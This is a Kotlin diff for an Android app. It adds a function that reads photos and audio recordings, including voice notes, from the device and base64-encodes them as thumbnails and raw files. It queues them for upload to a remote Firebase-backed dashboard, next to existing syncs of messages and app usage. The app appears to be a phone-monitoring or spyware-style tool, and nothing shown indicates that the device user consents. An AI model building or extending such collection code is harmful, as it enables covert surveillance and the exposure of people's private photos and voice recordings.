@@ -155,6 +155,81 @@ class DataRepository @Inject constructor(
         return msgs to rows.last().id
     }
 
+    /**
+     * Uploads the actual FILE content for media rows newer than [lastId]
+     * (photos as downscaled JPEG thumbnails, small audio recordings/voice
+     * notes as-is), so the dashboard can display a preview instead of only a
+     * path. Runs on a separate cursor so metadata and heavy payloads never
+     * block each other; unreadable or oversized files are skipped (cursor
+     * advances) rather than retried forever. Videos are metadata-only.
+     */
+    suspend fun mediaFileSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
+        val rows = dao.getMediaAfter(lastId, limit)
+        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
+        val msgs = mutableListOf<SyncMessage>()
+        for (row in rows) {
+            val mime = row.mimeType?.lowercase() ?: ""
+            val payload = when {
+                mime.startsWith("image/") -> encodeImageThumbnail(row.path)
+                mime.startsWith("audio/") -> encodeAudioFile(row.path)
+                else -> null
+            }
+            if (payload != null) {
+                msgs.add(
+                    SyncMessage(
+                        if (mime.startsWith("audio/")) "audio_file" else "photo_file",
+                        toJson(
+                            "path" to row.path, "name" to row.name, "mime" to row.mimeType,
+                            "dateAdded" to row.dateAdded, "ts" to row.dateAdded, "data" to payload
+                        ),
+                        row.dateAdded
+                    )
+                )
+            }
+        }
+        return msgs to rows.last().id
+    }
+
+    // Downscale to max 512 px, JPEG q60 — a small enough base64 payload to
+    // live inside a capped Firebase module collection while still being
+    // legible in the dashboard grid.
+    private fun encodeImageThumbnail(path: String): String? {
+        return try {
+            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            android.graphics.BitmapFactory.decodeFile(path, bounds)
+            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
+            var sample = 1
+            while (bounds.outWidth / (sample * 2) >= 512 && bounds.outHeight / (sample * 2) >= 512) sample *= 2
+            val opts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
+            val bmp = android.graphics.BitmapFactory.decodeFile(path, opts) ?: return null
+            val scale = minOf(1f, 512f / maxOf(bmp.width, bmp.height))
+            val scaled = if (scale < 1f) {
+                android.graphics.Bitmap.createScaledBitmap(
+                    bmp, (bmp.width * scale).toInt().coerceAtLeast(1),
+                    (bmp.height * scale).toInt().coerceAtLeast(1), true
+                )
+            } else bmp
+            val out = java.io.ByteArrayOutputStream()
+            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out)
+            if (scaled !== bmp) scaled.recycle()
+            bmp.recycle()
+            android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    // Voice notes / recordings up to 1 MB fit inside the capped audio module.
+    private fun encodeAudioFile(path: String): String? {
+        return try {
+            val f = java.io.File(path)
+            if (!f.exists() || !f.canRead() || f.length() > 1_000_000L) return null
+            android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
     suspend fun appUsageSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
         val rows = dao.getAppUsageAfter(lastId, limit)
         if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
